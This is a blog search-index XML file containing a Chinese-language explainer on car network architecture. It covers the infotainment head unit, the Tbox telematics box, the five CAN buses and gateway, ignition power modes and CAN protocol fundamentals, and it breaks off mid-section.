<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>车联网整车架构</title>
    <link href="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/"/>
    <url>/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="车机娱乐系统"><a href="#车机娱乐系统" class="headerlink" title="车机娱乐系统"></a>车机娱乐系统</h1><p>基本来说，当今的智能汽车基本有以下特点：</p><ol><li>基于操作系统，Android、Linux、yunos等</li><li>基本是虚拟按键</li><li>具备外网连接功能，即搭载Tbox盒子</li><li>有配套的车联网APP，可以远程当作手机钥匙和远程车控等功能</li><li>具备控制：空调、数字液晶仪、360环式摄像头、天窗、大灯的应用程序</li></ol><p>由上可知, 与车机娱乐系统互联且能在车机端直接控制的车内智能硬件有: 空调, 仪表, 360环视摄像头, 其他车身设备(天窗, 车窗, 大灯)这4类.</p><p>由以下拓扑图可知: </p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%8B%93%E6%89%91%E5%9B%BE.png" class=""><ol><li>车机娱乐系统是ECAN上的一个节点，节点名称为VAES</li><li>空调时BCAN上的一个节点，名称为AC</li><li>仪表是ECAN上的节点，节点名称为IPK，也有叫ICU</li><li>360智能环视摄像头是BCAN上的节点，节点名称为AVM</li><li>其他车身设备（天窗、车窗、大灯）等设备是BCAN上的BCM节点统一管理</li></ol><p>所以车机娱乐系统就是整车CAN网络中的ECAN总线的一个节点，该节点一般叫VAES（Video Audio Entertainment System）。</p><p><strong>VAES(车机)节点订阅消息(接收): 车机就是一台显示器</strong></p><p>注:<em>ECU（电子控制单元）都是带EEPROM(可擦写可编程存储器)的, 基本上任何一次修改后, 都会在ECU内部做参数保存的</em></p><p><strong>场景一:</strong> </p><p>车机一开机, 自动显示上一次的空调状态.</p><p>比如空调是开启还是关闭状态, 车内温度, 空调风量, 运行模式是自动还是手动等, 即开机后, AC(空调)节点自动源源不断地发送自己的参数及状态信号,</p><p>以上信号经由网关转发并广播后, 被VAES(车机)节点订阅(接收)后显示在空调APP上。</p><p><strong>场景二:</strong></p><p>车机一开机, 自动显示上一次保存的大灯高度设置值</p><p>即开机后, BCM(天窗, 车窗, 大灯)节点自动源源不断地发送自己的参数及状态信号, 以上信号经由网关转发并广播后, 被VAES(车机)节点订阅(接收)后显示到车辆控制与设置界面.</p><p><strong>VAES(车机)节点发送消息: 车机就是一台远程控制器</strong></p><p><strong>场景一:</strong> </p><p>运行空调App, 比如手动调节到30度, 大风量, 以上信号由CAN网关转发并广播后, 最终被给AC(空调)节点订阅(接收)并成功解析后执行, 并在AC节点端保存以上设置数据.</p><p><strong>场景二:</strong> </p><p>点击车辆控制界面, 设置大灯设置信号, 比如我手动调节大灯高度或持续时间等, 以上信号会由CAN网关转发, 最终被BCM节点订阅(接收)并成功解析后执行, 并在BCM节点端保存以上设置.</p><p><strong>场景三:</strong> </p><p>智能液晶仪表tab切换显示, 比如从地图tab切到音乐tab, 以上信号直接传给IPK(仪表)节点进行解析执行并在IPK节点端保存以上设置. (由于仪表和车机同属于ECAN所以无需通过CAN网关转发, 可直接互传信号)</p><p><strong>场景四:</strong> </p><p>运行360环视App, 将自动打开所有4个方位的摄像头, 以上信号是先发给CAN网关, CAN网关广播后最终被AVM节点订阅后执行.</p><p>Q:车机节点是如何把原始CAN信号转成用户能够看得懂的文字或图像的呢.</p><p>A: 车机节点是车机上的一块MCU, 专门负责车机主机对整车CAN网络的CAN信号转换的, 业界一般用IPCL协议进行CAN信号到字符串信号(程序员能识别的信号)的转换, 以上字符串信号经过Carservice或App的解析后, 转成文字或者图像的界面供用户选择和使用。</p><h1 id="TBOX介绍"><a href="#TBOX介绍" class="headerlink" title="TBOX介绍"></a>TBOX介绍</h1><p>上一节 讲到了智能车载娱乐系统的5个基本特征:</p><p>基本来说, 当今的智能车机基本有以下几个特点:</p><ol><li>基于智能操作系统: Android, Yunos, Linux等</li><li>基本都是虚拟按键, 较少用实体按键</li><li>具备外网连接功能, 即搭载了Tbox盒子</li><li>有配套的车联网手机App, 具有手机钥匙及远程车控等功能</li><li>具备控制: 空调, 数字液晶仪表, 360度环视摄像头, 其他车身设备(天窗, 车窗, 大灯)的应用程序.</li></ol><p>以上涉及的第3点，第4点都必须有Tbox设备才能实现</p><p>Tbox是汽车上的一个盒子，其实是一个Android操作系统的带通讯功能的盒子，<br>内含一张SIM卡，一般是中国联通SIM卡，与这个盒子配套硬件还有GPS天线，4G天线等。<br>车机要联网必须有Tbox设备才能实现。</p><p>Tbox实例图：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/tbox.png" class=""><p>TBOX的功能如下：</p><ol><li>Tbox可以给车机提供外网连接功能。</li></ol><p>如何提供外网, 原理很简单, 可以简单的把它当做是USB上网卡。</p><p>将这个接口接入自己的笔记本电脑, 在电脑网络连接那边就会多一个USB Ethernet的本地连接. 且确认过可以通过此连接成功上网.</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/USBEthernet.png" class=""><ol start="2"><li><p>Tbox可以提供GPS定位服务。</p><p> Tbox有GPS天线接入，车机通过USB数据输出接口实时获取GPS定位信息。<br>(Tbox的USB接口，除了提供外网数据, 提供GPS数据外，开发人员还可以通过这个USB线进行Tbox开发及adb debug等。)</p><p>实车路试过程中, 只要把tbox的GPS天线接入接口拔掉, 整个车机的地图定位将完全废掉, 地图定位将出现各种飘…</p></li><li><p>Tbox是Diag CAN(诊断CAN)上的一个节点, 该节点可提供本地诊断和远程诊断等功能</p><p>一般地, 智能车机娱乐系统有配套的车联网手机App,<br>该车联网手机App可远程查看车机状态, 远程开启座椅加热, 远程开启空调, 远程获取车机状态信息等.</p><p>比如以下是某公司开发的车联网手机App.</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E8%BD%A6%E8%81%94%E7%BD%91%E6%89%8B%E6%9C%BAApp.png" class=""></li></ol><p>车联网手机App控制车辆的拓扑图：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/App%E6%8E%A7%E5%88%B6%E8%BD%A6%E8%BE%86%E6%8B%93%E6%89%91%E5%9B%BE.png" class=""><p>车联网手机App状态查询/远程控制功能的实现，全部依托Tbox节点，<br>Tbox节点可以接收远程4G信号，<br>之后由Tbox在诊断CAN上发起CAN诊断及控制命令，<br>Tbox还实时获取相关CAN信号并上传云平台，云平台返回数据到车联网手机App。<br>最终达到<strong>远程诊断</strong>(远程获取车辆状态, 远程读取故障码等…) 和 <strong>远程控制</strong>(控制车上某些智能硬件的作用, 比如空调, 座椅加热等…)。</p><p>这也是Tbox最最最主要的功能了, 因为他已经实现了远程诊断并控制整车了, 只要功能开发的好, 理论上整车上的所有智能硬件设备均可以被tbox远程控制!!!</p><p>Q:Tbox既然接了4G SIM卡, 那是不是可以直接打电话呢??</p><p>A: 不可以, 这张SIM一般只给车主用户提供网络服务, 虽然这张电话可以打电话, 但是由于车机系统的功能接口限定(软件界面上的功能限定), 限定了其只可以拨打道路救援电话, 厂商客服电话, 110等紧急电话, 不可拨打普通手机号码或电话号码等.</p><p>一个Tbox一个号码, 一般绑定了固定的一辆车.</p><p>比如当救援公司接到你通过车机的道路救援功能拨打的救援电话后, 救援公司立马就知道车主是哪位, 绑定的是哪辆车, 及可能知道车辆的具体位置等, 之后就可快速实施道路救援了.</p><p>Q:Tbox上这么多PIN脚是干嘛的??</p><p>A: 包括12V正负极电源供电pin脚, 诊断CAN高/CAN低pin脚, 部分外设信号pin脚, 还包括预留的部分pin脚等。</p><h1 id="整车CAN网络介绍"><a href="#整车CAN网络介绍" class="headerlink" title="整车CAN网络介绍"></a>整车CAN网络介绍</h1><p>在了解can网络之前, 先了解1个问题:</p><h2 id="1-什么是智能硬件与ECU？"><a href="#1-什么是智能硬件与ECU？" class="headerlink" title="1. 什么是智能硬件与ECU？"></a>1. 什么是智能硬件与ECU？</h2><p>何为智能硬件, 就是包含智能控制单元的硬件, 比如发动机, 发动机上有一块儿专门负责控制发动机进气量, 喷油量, 排气量的控制单元, 这块单元相当于发动机的大脑. 他具有信号发送, 信号接收, 参数存储等基本功能, 这个控制单元就是ECU.</p><pre><code> ECU(Electronic ControlUnit）电子控制单元，是汽车专用微机控制器, 一个ECU一般负责1个或多个智能硬件设备. 随着汽车的发展, 车上的智能设备越来越多, 也就是说车上的ECU也越来越多, 如何用一个网络把这些智能设备的ECU全部连接起来并整体协调控制?</code></pre><p><strong>这就是CAN网络</strong></p><h2 id="2-什么是CAN网络"><a href="#2-什么是CAN网络" class="headerlink" title="2. 什么是CAN网络"></a>2. 什么是CAN网络</h2><p>CAN是控制器局域网络(Controller Area Network, CAN)的简称，目前普遍运用在汽车网络.</p><h2 id="3-CAN网络的优势"><a href="#3-CAN网络的优势" class="headerlink" title="3. CAN网络的优势"></a>3. CAN网络的优势</h2><ol><li>开放的标准</li><li>低成本</li><li>高速实时传递数据更安全可靠</li><li>适用于各种汽车</li></ol><h2 id="4-早期基本结构图"><a href="#4-早期基本结构图" class="headerlink" title="4. 早期基本结构图"></a>4. 早期基本结构图</h2><p>CAN网络在早期的整车应用中以BCM(车身控制器)为控制中心，<br>主要是车身零部件(雨刮/大灯/车窗…)，智能硬件较少，所以早期的正常CAN网络把所有其他的ECU全部放在Other ECU里边，<br>如下图。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%97%A9%E6%9C%9F%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84%E5%9B%BE.png" class=""><h2 id="5-当今主流结构图"><a href="#5-当今主流结构图" class="headerlink" title="5. 当今主流结构图"></a>5. 当今主流结构图</h2><p>随着智能硬件的越来越多, 且考虑到成本与安全, </p><p>BCM已经不够完成如此庞大的网络管理了, 网关应运而生, </p><p>网关管理了5条CAN总线的各类ECU, </p><p>并对这5条CAN总线的波特率及信号优先级做了区分. </p><p>之前管理一堆车身零部件(雨刮/大灯/车窗…)的BCM也成了BCAN的一个节点!</p><p>现如今的燃油车整车CAN网络主要以网关为控制中心,   以下主要介绍这种类型的CAN网络.</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="6-CAN基本构成单元ECU节点"><a href="#6-CAN基本构成单元ECU节点" class="headerlink" title="6. CAN基本构成单元ECU节点"></a>6. CAN基本构成单元ECU节点</h2><p>车上的智能硬件设备里ECU控制单元。</p><p>比如ABS(防抱死系统)这个ECU是专门用于车辆制动过程中防止车轮被抱死的一套智能设备。</p><p> 当今汽车越豪华,ECU就越多,智能控制硬件就越多,相对价格就越贵.一般的,一辆车普通的家用  轿车都有25个左右ECU。</p><p>如下图, 车上某个智能硬件上的ECU(智能电子控制单元)</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/ECU%E8%8A%82%E7%82%B9.png" class=""><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="7-CAN网络基本构成单元CAN总线"><a href="#7-CAN网络基本构成单元CAN总线" class="headerlink" title="7. CAN网络基本构成单元CAN总线"></a>7. CAN网络基本构成单元CAN总线</h2><p>由于车上ECU太多, 每种ECU作用各不相同, 信号传输速率(波特率)也不一致.**</p><p><strong>为了更加方便管理这些ECU, 我们把以上各类ECU按其功能/波特率分别布置在5条CAN总线上.</strong></p><p>也叫CAN BUS, 为了方便测试人员理解, 可以理解成CAN支线(可理解成一个路由器上的5条分口引出来的分支网线).</p><p>一般地, 分成5条CAN总线:</p><h3 id="7-1-PT-CAN-PowerTrain-CAN"><a href="#7-1-PT-CAN-PowerTrain-CAN" class="headerlink" title="7.1 PT CAN (PowerTrain CAN )"></a>7.1 PT CAN (PowerTrain CAN )</h3><p>动力总成CAN总线</p><p>PT CAN总线上一般有以下ECU:</p><h3 id="7-2-CH-CAN-Chassis-CAN"><a href="#7-2-CH-CAN-Chassis-CAN" class="headerlink" title="7.2 CH CAN (Chassis CAN)"></a>7.2 CH CAN (Chassis CAN)</h3><p>底盘控制CAN总线</p><p>CH CAN总线上一般有以下ECU:</p><table><thead><tr><th>ABS ( Antilock Brake System )</th><th>防抱死制动系统</th></tr></thead><tbody><tr><td>ESP(Electronic Stability Program)</td><td>车身电子稳定系统</td></tr><tr><td>EPS(Electric Power Steering)</td><td>电子转向助力</td></tr></tbody></table><p><strong>CH CAN负责汽车底盘及4个轮子的制动/稳定/转向，由于涉及整车制动/助力转向等, 所以其网络信号优先级也是较高的。</strong></p><h3 id="7-3-Body-CAN"><a href="#7-3-Body-CAN" class="headerlink" title="7.3. Body CAN"></a>7.3. Body CAN</h3><p>车身控制总线</p><p>Body CAN总线上一般有以下ECU:</p><table><thead><tr><th align="left">AC ( Air Condition )</th><th>空调</th></tr></thead><tbody><tr><td align="left">AVM(Around View Monitor)</td><td>360环视</td></tr><tr><td align="left">BCM(Body Control Module)</td><td>天窗, 车窗, 雾灯, 转向灯, 雨刮…</td></tr><tr><td align="left">IMMO(Immobilizer)</td><td>发动机防盗系统</td></tr><tr><td align="left">TPMS(Tire Pressure Monitoring System)</td><td>胎压监控系统</td></tr></tbody></table><p><strong>ody CAN负责车身上的一些提高舒适性/安全性的智能硬件的管理与控制，其网络信号优先级较低, 因为以上设备都是辅助设备。</strong></p><h3 id="7-4-Info-CAN-InfomercialCAN"><a href="#7-4-Info-CAN-InfomercialCAN" class="headerlink" title="7.4 Info CAN(InfomercialCAN)"></a>7.4 Info CAN(InfomercialCAN)</h3><p>娱乐系统总线</p><p>Info CAN 总线上一般有以下ECU:</p><table><thead><tr><th>VAES( Video Audio Entertainment System)</th><th>车载娱乐系统(中控)</th></tr></thead><tbody><tr><td>IPK(Instrument Pack)</td><td>组合仪表, 当今的数字仪表, 基本有音乐, 地图, 通话等娱乐功能.</td></tr></tbody></table><h3 id="7-5DiagCAN-Diagnose-CAN"><a href="#7-5DiagCAN-Diagnose-CAN" class="headerlink" title="7.5DiagCAN ( Diagnose CAN)"></a>7.5DiagCAN ( Diagnose CAN)</h3><p>诊断控制总线</p><table><thead><tr><th>Tbox(Telematics BOX)</th><th>远程控制模块</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><h3 id="7-6总体拓扑"><a href="#7-6总体拓扑" class="headerlink" title="7.6总体拓扑"></a>7.6总体拓扑</h3> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%80%BB%E4%BD%93%E6%8B%93%E6%89%91.png" class=""><p> 每条CAN总线都是由2根线组成的双绞线构成, 一根can_high, 一根can_low, 分别代表高电平, 低电平。</p><p>以下是某条CAN总线的模型图, 一条CAN总线上连着4个ECU控制单元</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/ECU%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E6%8B%93%E6%89%91.png" class=""><h2 id="8-CAN网关"><a href="#8-CAN网关" class="headerlink" title="8. CAN网关"></a>8. CAN网关</h2><p>CAN网关或叫汽车网关，因为网关不仅处理CAN网络，还处理LIN网络.</p><p>CAN网关的外形结构:</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E7%BD%91%E5%85%B3.png" class=""><p>实际can网关大概有六七十个接线pin脚，每个接线pin脚都有严格的定义, 要匹配规定好的can总线或者开关设备,<br>除了刚才涉及的10个can线接线口(5条双绞线)，2个电源线接线口，<br>还应包括<br>定速巡航设备的8个接线口，<br>电源管理方面的3个接线口，<br>钥匙开关(或无钥匙启动系统)的5个接口，<br>脚踏板的3个接线口，<br>5个LIN接线pin脚，<br>档位开关的4个接线pin脚<br>等等。</p><p>某些汽车厂商可能有更多新的硬件开关设备，电压电阻开关设备等也都有对应的接线pin脚,<br>且可能预留一些PIN脚以备用.</p><h3 id="8-1-基本功能"><a href="#8-1-基本功能" class="headerlink" title="8.1 基本功能"></a>8.1 基本功能</h3><p>CAN网关是整个CAN网络的核心, 控制着整车5条CAN总线的各类信号转发与处理，基本功能包括:</p><ol><li>连接不同波特率(传输速度)的CAN总线/LIN总线，以实现CAN网络的网关中继功能。</li><li>诊断报文/非诊断报文转发。</li><li>诊断防火墙管理。</li><li>节点在线监控。</li><li>巡航控制器开关检测。</li><li>脚踏板位置检测。</li><li>网关休眠与唤醒管理。</li><li>ECU升级/网关升级。</li><li>电压管理。</li></ol><p>CAN网关可以接收任何CAN总线(还有LIN总线)传来的不同传输速率网络信号，把这些信号按一定的标准处理后，广播到整车网络去，如果有ECU订阅(接收)了这个信号, 则ECU将解析信号并做相应的处理。<br>整车所有ECU基本是以毫秒级或者微妙级的速度在源源不断的发送并接收信号，所以网关需要处理并转发广播的信号是非常多的且必须要很快处理完的。</p><h3 id="8-2-实例一仪表显示发动机转速"><a href="#8-2-实例一仪表显示发动机转速" class="headerlink" title="8.2 实例一仪表显示发动机转速"></a>8.2 实例一仪表显示发动机转速</h3><p>发动机的转速信号, 先从PCAN的ECM(发动机引擎控制模块)节点发出, CAN网关收到后,<br>网关处理后广播以GW_开头的ECM信号到其他4条CAN总线上去.<br>用Vehicle Spy 3 CAN工具查看可以看到以下的信号内容:</p><p>ECAN上的仪表(IPK)节点订阅(接收)了发动机转速信号, 则会将这个转速信号解析, 并显示到仪表盘去.<br>由于以上信号发送频率太快, 则你就会看到仪表盘上的转速指针一直在不停地偏动.</p><p>简略发送图如下:</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BB%AA%E8%A1%A8%E6%98%BE%E7%A4%BA%E5%8F%91%E5%8A%A8%E6%9C%BA%E8%BD%AC%E9%80%9F.png" class=""><h3 id="8-3-实例二安全带未扣紧-仪表端报警"><a href="#8-3-实例二安全带未扣紧-仪表端报警" class="headerlink" title="8.3 实例二安全带未扣紧, 仪表端报警"></a>8.3 实例二安全带未扣紧, 仪表端报警</h3><p>安全带未扣紧需要两个条件:</p><ol><li>车速大于5</li><li>安全带扣未扣 ( 即无电压信号 )</li></ol><p>车速一般是PCAN上的ECM(发动机引擎控制模块)节点负责信号管理的.<br>安全带扣这个设备是BCAN上的BCM(负责天窗, 车窗, 安全带扣, 雨刮等车身零部件设备…) 节点负责信号管理的.即网关收到PCAN上的ECM节点发出来的车速信号,<br>并收到了BCAN上的BCM发出来的安全带扣电压值为异常值(比如0),<br>CAN网关统一处理后转发并广播以GW_开头的信号帧,</p><p>ECAN上的仪表(IPK)节点订阅(接收)了GW开头的相关安全带未扣信号帧, 则会解析报警并显示到仪表盘去.<br>如果安全带扣一直未扣紧，则CAN网关将一直发送GW_开头的相关安全带信号帧，<br>其信号值是安全带未扣紧，所以车主会听到一直报警.</p><p>直到安全带扣上, CAN网关继续发送安全带相关的信号, 只是这个时候的信号值是安全带已扣紧，报警将立马消失.</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BB%AA%E8%A1%A8%E7%AB%AF%E6%8A%A5%E8%AD%A6.png" class=""><p>以上只是两个简易的案例, 实际上, 整车所有ECU基本是以毫秒级或者微妙级的速度在源源不断的发送并接收信号, 所以网关需要处理并转发广播的信号是非常多的且必须要很快处理完的.</p><h1 id="车机电源介绍"><a href="#车机电源介绍" class="headerlink" title="车机电源介绍"></a>车机电源介绍</h1><p>车辆钥匙孔的4种状态，即LOCK, ACC, ON, START，分别对应4种电源模式，即OFF模式，ACC模式，RUN模式，CRANK模式。</p><ul><li><p>OFF模式，就是上面的LOCK，代表车辆电源未通电，此时整车can网络一般也处于休眠状态。</p></li><li><p>ACC模式，是对应上面的ACC，是Accessory的简称，整车上电状态，整车通电了，can网络也会唤醒并开始传输信号，但是发动机未启动，整车基本通上了12V的电源电压，此时车窗可用，空调可以开启(但是由于发电机未开启, 空调制冷制热压缩机都无效果，只有鼓风机在吹风)。</p></li><li><p>CRANK模式，对应上面START，发动机点火状态，即发动机已经启动，实际操作中，就是将钥匙拧到底，等发动机点火成功后，钥匙孔反弹到上图的ON，也就是下面说的RUN模式。</p></li><li><p>RUN模式，对应上面的ON，发动机处于运行模式，此时发电机也运行，并给蓄电池充电，此时的空调制冷制热都可用。</p></li></ul><h1 id="CAN"><a href="#CAN" class="headerlink" title="CAN"></a>CAN</h1><h2 id="一、-CAN-总线概念"><a href="#一、-CAN-总线概念" class="headerlink" title="一、 CAN 总线概念"></a>一、 CAN 总线概念</h2><h3 id="1-1-什么是CAN总线"><a href="#1-1-什么是CAN总线" class="headerlink" title="1.1 什么是CAN总线"></a>1.1 什么是CAN总线</h3><p>CAN 是 Controller Area Network 的缩写，是 ISO 国际标准化的串行通信协议。<br>通俗来讲，<strong>CAN总线就是一种传输数据的线，用于在不同的ECU之间传输数据。</strong></p><p>CAN总线有两个ISO国际标准：<strong>ISO11898 和 ISO11519</strong>。</p><ul><li><p><strong>ISO11898</strong> 定义了通信速率为 125 kbps～1 Mbps 的<strong>高速 CAN</strong> 通信标准，属于<strong>闭环总线</strong>，传输速率可达1Mbps，总线长度 ≤ 40米。</p></li><li><p><strong>ISO11519</strong> 定义了通信速率为 10～125 kbps 的<strong>低速 CAN</strong> 通信标准，属于<strong>开环总线</strong>，传输速率为40kbps时，总线长度可达1000米。</p></li><li><blockquote><p> Tips: <strong>&lt;总线的传输速率&gt;<strong>：又称为</strong>总线的通信速率</strong>，指的是<strong>位速率</strong>。或称为<strong>比特率</strong>（和波特率不是一回事），表示的是：单位时间内，通信线路上传输的二进制位的数量，其基本单位是 bps 或者 b/s (bit per second)。</p></blockquote></li></ul><h3 id="1-2-CAN的拓扑结构"><a href="#1-2-CAN的拓扑结构" class="headerlink" title="1.2 CAN的拓扑结构"></a>1.2 CAN的拓扑结构</h3><p>下图中，左边是高速CAN总线的拓扑结构，右边是低速CAN总线的拓扑结构。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E7%9A%84%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84.png" class=""><p>如图中所示，CAN总线包括CAN_H 和 CAN_L 两根线。节点通过CAN控制器和CAN收发器连接到CAN总线上。</p><blockquote><p>Tips ：通常来讲，ECU内部集成了CAN控制器和CAN收发器，但是也有没集成的，需要自己外加。</p></blockquote><h3 id="1-3-CAN信号表示"><a href="#1-3-CAN信号表示" class="headerlink" title="1.3 CAN信号表示"></a>1.3 CAN信号表示</h3><p>在CAN总线上，利用CAN_H和CAN_L两根线上的电位差来表示CAN信号。CAN总线上的电位差分为显性电平和隐性电平。其中显性电平为逻辑0，隐性电平为逻辑1。<br>ISO11898标准（125kbps ~ 1Mbps）和ISO11519标准（10kbps ~ 125kbps）中CAN信号的表示分别如下所示：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E4%BF%A1%E5%8F%B7%E8%A1%A8%E7%A4%BA.png" class=""><h3 id="1-4-CAN信号传输"><a href="#1-4-CAN信号传输" class="headerlink" title="1.4 CAN信号传输"></a>1.4 CAN信号传输</h3><p>发送过程：<br>CAN控制器将CPU传来的信号转换为逻辑电平（即逻辑0-显性电平或者逻辑1-隐性电平）。CAN发射器接收逻辑电平之后，再将其转换为差分电平输出到CAN总线上。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E4%BF%A1%E5%8F%B7%E4%BC%A0%E8%BE%93.png" class=""><p>接收过程：<br>CAN接收器将CAN_H 和 CAN_L 线上传来的差分电平转换为逻辑电平输出到CAN控制器，CAN控制器再把该逻辑电平转化为相应的信号发送到CPU上。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E4%BF%A1%E5%8F%B7%E6%8E%A5%E6%94%B6.png" class=""><p>概括的讲：<br>发送方通过使总线电平发生变化，将其信息传递到CAN总线上。<br>接收方通过监听总线电平，将总线上的消息读入自己的接收器。</p><h2 id="二、CAN通信的特点"><a href="#二、CAN通信的特点" class="headerlink" title="二、CAN通信的特点"></a>二、CAN通信的特点</h2><h3 id="2-1-多主工作方式"><a href="#2-1-多主工作方式" class="headerlink" title="2.1 多主工作方式"></a>2.1 多主工作方式</h3><p>所谓多主工作方式，指的是：总线上的所有节点没有主从之分，大家都处于平等的地位。<br>反应在数据传输上，即是：在总线空闲状态，任意节点都可以向总线上发送消息。</p><p>Tips: &lt;总线空闲状态&gt;：当总线上的上出现连续的11位隐性电平，那么总线就处于空闲状态。也就是说对于任意一个节点而言，只要它监听到总线上连续出现了11位隐性电平，那么该节点就会认为总线当前处于空闲状态，它就会立即向总线上发送自己的报文。<br>至于为什么连续出现11位隐性电平，就可以判定+总线处于空闲状态，这个问题可以结合CAN协议的帧结构来进行理解。</p><p>在多主工作方式下：</p><ol><li>最先向总线发送消息的节点获得总线的发送权；</li><li>当多个节点同时向总线发送消息时，所发送消息的优先权高的那个节点获得总线的发送权。</li></ol><h3 id="2-2-非破坏性位仲裁机制"><a href="#2-2-非破坏性位仲裁机制" class="headerlink" title="2.2 非破坏性位仲裁机制"></a>2.2 非破坏性位仲裁机制</h3><p>在CAN协议中，所有的消息都以固定的帧格式发送。<br>当多个节点同时向总线发送消息时，对各个消息的标识符（即ID号）进行逐位仲裁，<br>如果某个节点发送的消息仲裁获胜，那么这个节点将获取总线的发送权，仲裁失败的节点则立即停止发送并转变为监听（接收）状态。</p><p>例如：Node_A和Node_B同时向总线发送各自的消息Msg_1和Msg_2，<br>那么对Msg_1的ID号ID_1和Msg_2的ID号ID_2进行逐位仲裁，<br>如果仲裁结果是：ID_1的优先级比ID_2高，那么Msg_1在仲裁中获胜，<br>于是发出Msg_1这条报文的节点Node_A就获得了总线的发送权。<br>同时，Msg_2在仲裁中失败，于是Node_B就转换到监听总线电平的状态。</p><p>这种仲裁机制既不会造成已发送数据的延迟，也不会破坏已经发送的数据，所以称为非破坏性仲裁机制。</p><h3 id="2-3-系统的柔性"><a href="#2-3-系统的柔性" class="headerlink" title="2.3 系统的柔性"></a>2.3 系统的柔性</h3><p>CAN总线上的节点没有“地址”的概念，因此在总线上增加节点时，不会对总线上已有节点的软硬件及应用层造成影响。</p><h3 id="2-4-通信速度"><a href="#2-4-通信速度" class="headerlink" title="2.4 通信速度"></a>2.4 通信速度</h3><p>在同一条CAN线上，所有节点的通信速度（位速率）必须相同，如果两条不同通信速度总线上的节点想要实现信息交互，必须通过网关。</p><p>例如：汽车上一般有两条CAN总线：500kbps的驱动系统CAN总线和125kbps的舒适系统CAN总线，如果驱动系统CAN总线上的发动机节点要把自己的转速信息发送给舒适系统CAN总线上的转速表节点，那么这两条总线必须通过网关相连。</p><h3 id="2-5-数据传输方式"><a href="#2-5-数据传输方式" class="headerlink" title="2.5 数据传输方式"></a>2.5 数据传输方式</h3><p>CAN总线可以实现一对一，一对多以及广播的数据传输方式，这依赖于验收滤波技术。验收滤波技术的实现机制参见本系列笔记的第二篇CAN协议帧结构中的介绍。</p><h3 id="2-6-远程数据请求"><a href="#2-6-远程数据请求" class="headerlink" title="2.6 远程数据请求"></a>2.6 远程数据请求</h3><p>某个节点Node_A可以通过发送“遥控帧”到总线上的方式，请求某个节点Node_B来发送由该遥控帧所指定的报文。</p><h3 id="2-7-错误检测、错误通知、错误恢复功能"><a href="#2-7-错误检测、错误通知、错误恢复功能" class="headerlink" title="2.7 错误检测、错误通知、错误恢复功能"></a>2.7 错误检测、错误通知、错误恢复功能</h3><p>所有的节点都可以检测出错误（错误检测功能）；<br>检测出错误的节点会立即通知总线上其它所有的节点（错误通知功能）；<br>正在发送消息的节点，如果检测到错误，会立即停止当前的发送，并在同时不断地重复发送此消息，直到该消息发送成功为止（错误恢复功能）。</p><h3 id="2-8-故障封闭"><a href="#2-8-故障封闭" class="headerlink" title="2.8 故障封闭"></a>2.8 故障封闭</h3><p>节点能够判断错误的类型，判断是暂时性的数据错误（如噪声干扰）还是持续性的数据错误（如节点内部故障），如果判断是严重的持续性错误，那么节点就会切断自己与总线的联系，从而避免影响总线上其他节点的正常工作。</p><h2 id="三、CAN通信网络结构"><a href="#三、CAN通信网络结构" class="headerlink" title="三、CAN通信网络结构"></a>三、CAN通信网络结构</h2><h3 id="3-1-OSI基本参照模型"><a href="#3-1-OSI基本参照模型" class="headerlink" title="3.1 OSI基本参照模型"></a>3.1 OSI基本参照模型</h3><p>实际上，CAN总线网络底层只采用了OSI基本参照模型中的数据链路层、传输层。而在CAN网络高层仅采用了OSI基本参照</p> <img 